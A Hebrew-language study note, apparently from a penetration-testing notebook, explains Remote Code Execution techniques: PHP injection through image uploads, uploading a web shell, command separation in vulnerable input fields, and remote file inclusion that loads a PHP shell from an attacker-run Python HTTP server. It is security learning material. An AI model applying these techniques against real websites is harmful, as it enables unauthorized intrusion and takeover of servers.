RCE - Remote Code Execution
# המטרה
כאן המטרה זה להריץ פקודות מערכת כלשהי כמו whoami או ls כל פקודת מערכת בווינדוס או בלינוקס
# אינדיקציה
* פגיעות של RCE היא הרצת פקודה מרחוק ויכולה להתבצע בכמה דרכים:
1. פונקציונליות של העלאת קבצים 
2. נזהה שדה קלט פגיע ע"י בדיקה
3. ננסה להזריק פקודות מערכת ישירות לשדה קלט
	* זה טוב אם יש שיקוף של הקלט באתר למשל
4. ניצול של [[RFI]]

## העלאת קבצים
#### אופציה 1
* כל מנגנון של העלאת קבצים בין אם זה תמונות קבצים או כל דבר אחר ישר אמור להקפיץ לנו חשד שאפשר לבצע RCE
* גם פורום של תגובות יכול להיות פוטנציאל אל RCE
* נניח נראה אופציה של העלאת תמונות, ננסה להזריק פקודת מערכת בphp יחד עם התמונה
<img width="738" height="504" alt="Pasted image 20250723000050" src="https://github.com/user-attachments/assets/7b2b614a-e497-41c2-8a38-e795e6cf2e6f" />

* לשים לב לכל מה שמסומן באדום בבקשה, ואם בתגובה התקבל שהתגובה נשלחה בהצלחה זה אומר שהתמונה עלתה
* כעת ננסה לגשת לתמונה
<img width="692" height="223" alt="Pasted image 20250723000218" src="https://github.com/user-attachments/assets/c61ecf09-9cc2-49e1-b2b4-8c6c5a3ff0ff" />

* הצלחנו אם הפקודה עבדה
* המטרה בסוף זה להצליח לבצע פקודות מערכת כמו בדוגמא echo ומכאן יש לנו שליטה כמו cmd ואפשר להגיע למה שביקשו
#### אופציה 2
במקום להעלות פקודת מערכת אחת, ננסה להעלות shell בphp (בסיסי למשל) ואז יהיה לנו גישה לcmd 
## שדה קלט פגיע
* אם נזהה שדה קלט מסוים ובמיוחד שהאתר הוא עם סיומת php למשל:
 <img width="407" height="48" alt="Pasted image 20250723000448" src="https://github.com/user-attachments/assets/429b60c8-b42b-4b81-ba62-f634c503d077" />
 
* זה אינדיקציה לאפשרות של RCE
* לשים לב שהדוגמא זה בGET והמשתנים בURL אבל ייתכן והם יהיו בגוף הבקשה בPOST
* מאחורי הקלעים יש מצב שהמערכת מקבלת את המשתנה ואז למשל ואז משלימה את הפקודה :
```
echo admin;
```
* ולכן אם מראש נבצע הפרדה כלשהי נוכל לעשות פקודות מערכת משלנו
<img width="481" height="34" alt="Pasted image 20250723000858" src="https://github.com/user-attachments/assets/9d51cce0-9e93-4495-b643-970a48f19679" />


## ניצול של RFI
* אם גילינו RFI שטוען קבצים משרת מרוחק שלי למשל:
````
http://example.com/index.php?module=http://server2.example.com/welcome.php
````

* כל שנצטרך לעשות הוא להכין קובץ shell בphp למשל
	* לחפש באינטרנט או לשאול AI
* להרים שרת http שממנו נטען את הקובץ (באמצעות הכתובת)
	* עובד במחשב רק אם יש פייתון מותקן (לא בVScode אלא ממש אפליקציית פייתון)
	* אם אין, להרים מkali linux יש שם באופן דיפולטיבי
```
python -m http.server 1234
```
* ואז ניגש אל הshell במיקום המדויק בעזרת RFI
